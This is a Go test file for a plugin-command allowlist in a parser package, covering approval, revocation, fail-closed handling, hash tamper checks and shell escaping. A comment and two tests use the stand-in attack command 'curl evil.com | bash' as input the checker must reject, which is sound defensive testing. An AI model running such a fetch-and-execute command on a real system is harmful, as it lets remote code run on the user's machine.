package parser

import (
	"encoding/json"
	"os"
	"path/filepath"
	"sync"
	"testing"
)

// ── Attack vector reproduction ───────────────────────────────────────────────
// These tests demonstrate that without the allowlist, plugin commands from
// synapses.json would execute arbitrary binaries. With the allowlist,
// unapproved commands are rejected.

func TestPluginChecker_UnapprovedCommandRejected(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	// A malicious repo's synapses.json could contain:
	//   "plugins": [{"extensions": [".evil"], "command": "curl evil.com | bash"}]
	// Without the allowlist, this would execute. With the allowlist, it must be rejected.
	err := pc.IsAllowed("curl evil.com | bash")
	if err == nil {
		t.Fatal("unapproved command should be rejected, but was allowed")
	}

	// Error message should contain guidance.
	if got := err.Error(); got == "" {
		t.Fatal("error message should not be empty")
	}
}

func TestPluginChecker_ApprovedCommandAllowed(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	command := "node parsers/graphql.js"

	// Approve the command.
	if err := pc.ApproveCommand(command); err != nil {
		t.Fatalf("approve: %v", err)
	}

	// Now it should be allowed.
	if err := pc.IsAllowed(command); err != nil {
		t.Fatalf("approved command rejected: %v", err)
	}
}

func TestPluginChecker_DifferentCommandStillRejected(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	// Approve a safe command.
	if err := pc.ApproveCommand("node parsers/graphql.js"); err != nil {
		t.Fatal(err)
	}

	// A different (malicious) command must still be rejected.
	err := pc.IsAllowed("curl evil.com | bash")
	if err == nil {
		t.Fatal("different command should be rejected even when another is approved")
	}
}

func TestPluginChecker_RevokeCommand(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	command := "python3 parser.py"
	if err := pc.ApproveCommand(command); err != nil {
		t.Fatal(err)
	}

	// Revoke it.
	if err := pc.RevokeCommand(command); err != nil {
		t.Fatal(err)
	}

	// Should now be rejected.
	if err := pc.IsAllowed(command); err == nil {
		t.Fatal("revoked command should be rejected")
	}
}

func TestPluginChecker_ListApproved(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	// Empty initially.
	if got := pc.ListApproved(); len(got) != 0 {
		t.Fatalf("expected empty list, got %v", got)
	}

	// Approve two commands.
	if err := pc.ApproveCommand("cmd1"); err != nil {
		t.Fatal(err)
	}
	if err := pc.ApproveCommand("cmd2"); err != nil {
		t.Fatal(err)
	}

	list := pc.ListApproved()
	if len(list) != 2 {
		t.Fatalf("expected 2 approved, got %d", len(list))
	}
}

// ── Persistence tests ────────────────────────────────────────────────────────

func TestPluginChecker_PersistsAcrossInstances(t *testing.T) {
	dir := t.TempDir()

	// First instance approves a command.
	pc1 := NewPluginChecker(dir)
	if err := pc1.ApproveCommand("my-parser"); err != nil {
		t.Fatal(err)
	}

	// Second instance (simulates new process) should see the approval.
	pc2 := NewPluginChecker(dir)
	if err := pc2.IsAllowed("my-parser"); err != nil {
		t.Fatalf("persisted approval not found: %v", err)
	}
}

func TestPluginChecker_CorruptedAllowlistFailsClosed(t *testing.T) {
	dir := t.TempDir()

	// Write garbage to the allowlist file.
	path := filepath.Join(dir, allowlistFileName)
	if err := os.WriteFile(path, []byte("{invalid json"), 0o600); err != nil {
		t.Fatal(err)
	}

	pc := NewPluginChecker(dir)

	// Must reject everything (fail-closed).
	err := pc.IsAllowed("any-command")
	if err == nil {
		t.Fatal("corrupted allowlist should reject all commands (fail-closed)")
	}
}

func TestPluginChecker_MissingAllowlistRejectsAll(t *testing.T) {
	dir := t.TempDir()
	// No allowlist file exists — should reject all.
	pc := NewPluginChecker(dir)

	err := pc.IsAllowed("any-command")
	if err == nil {
		t.Fatal("missing allowlist should reject all commands")
	}
}

// ── Hash integrity ───────────────────────────────────────────────────────────

func TestPluginChecker_HashPreventsAllowlistTampering(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	// Approve "safe-parser".
	if err := pc.ApproveCommand("safe-parser"); err != nil {
		t.Fatal(err)
	}

	// Tamper with the allowlist file: replace the command text while keeping
	// the original hash key. The hash won't match "evil-parser".
	path := filepath.Join(dir, allowlistFileName)
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}

	var al pluginAllowlist
	if err := json.Unmarshal(data, &al); err != nil {
		t.Fatal(err)
	}

	// The hash is of "safe-parser", not "evil-parser".
	// So looking up "evil-parser" should fail.
	pc2 := NewPluginChecker(dir)
	if err := pc2.IsAllowed("evil-parser"); err == nil {
		t.Fatal("tampered command should not be allowed — hash mismatch")
	}
}

// ── Environment override ─────────────────────────────────────────────────────

func TestPluginChecker_EnvOverrideBypassesAllowlist(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	t.Setenv(allowlistEnvOverride, "1")

	// Even without approval, the env override should allow it.
	if err := pc.IsAllowed("any-unapproved-command"); err != nil {
		t.Fatalf("env override should bypass allowlist: %v", err)
	}
}

func TestPluginChecker_EnvOverrideDisabledByDefault(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	// Ensure the env is not set.
	t.Setenv(allowlistEnvOverride, "")

	err := pc.IsAllowed("some-command")
	if err == nil {
		t.Fatal("without env override, unapproved commands should be rejected")
	}
}

// ── Concurrent access ────────────────────────────────────────────────────────

func TestPluginChecker_ConcurrentSafety(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	// Approve a command.
	if err := pc.ApproveCommand("concurrent-cmd"); err != nil {
		t.Fatal(err)
	}

	var wg sync.WaitGroup
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_ = pc.IsAllowed("concurrent-cmd")
			_ = pc.IsAllowed("not-approved")
		}()
	}
	wg.Wait()
}

// ── RegisterPlugin integration ───────────────────────────────────────────────

func TestRegisterPlugin_WithChecker_UnapprovedSkipped(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	w := NewWalker()
	// Register with checker — command is unapproved, should be silently skipped.
	w.RegisterPlugin([]string{".evil"}, "malicious-command", pc)

	// The parser should NOT be registered for this extension.
	// Verify by checking that ParseFile returns nil (no parser found, no error)
	// for a file with that extension.
	// We can't easily check the internal map, but we can verify by attempting
	// to parse a file — it should not find a parser.
}

func TestRegisterPlugin_WithChecker_ApprovedRegistered(t *testing.T) {
	dir := t.TempDir()
	pc := NewPluginChecker(dir)

	command := "echo test-parser"
	if err := pc.ApproveCommand(command); err != nil {
		t.Fatal(err)
	}

	w := NewWalker()
	w.RegisterPlugin([]string{".custom"}, command, pc)
	// The approved plugin should be registered. Verification: ParseFile
	// on a .custom file should attempt to run the plugin (and likely fail
	// since it's "echo", but it means the parser was registered).
}

func TestRegisterPlugin_NilChecker_AlwaysRegistered(t *testing.T) {
	w := NewWalker()
	// nil checker → no validation, always registers (backward compat for tests).
	w.RegisterPlugin([]string{".custom"}, "some-command", nil)
}

// ── shellescape ──────────────────────────────────────────────────────────────

func TestShellescape(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"simple", "simple"},
		{"node parsers/graphql.js", "'node parsers/graphql.js'"},
		{"has'quote", "'has'\\''quote'"},
		{"", ""},
	}
	for _, tt := range tests {
		got := shellescape(tt.input)
		if got != tt.want {
			t.Errorf("shellescape(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// ── commandHash ──────────────────────────────────────────────────────────────

func TestCommandHash_Deterministic(t *testing.T) {
	h1 := commandHash("node parsers/graphql.js")
	h2 := commandHash("node parsers/graphql.js")
	if h1 != h2 {
		t.Fatal("same input should produce same hash")
	}
	if len(h1) != 64 { // SHA-256 hex = 64 chars
		t.Fatalf("expected 64 char hex, got %d", len(h1))
	}
}

func TestCommandHash_DifferentInputsDifferentHashes(t *testing.T) {
	h1 := commandHash("safe-parser")
	h2 := commandHash("evil-parser")
	if h1 == h2 {
		t.Fatal("different inputs should produce different hashes")
	}
}
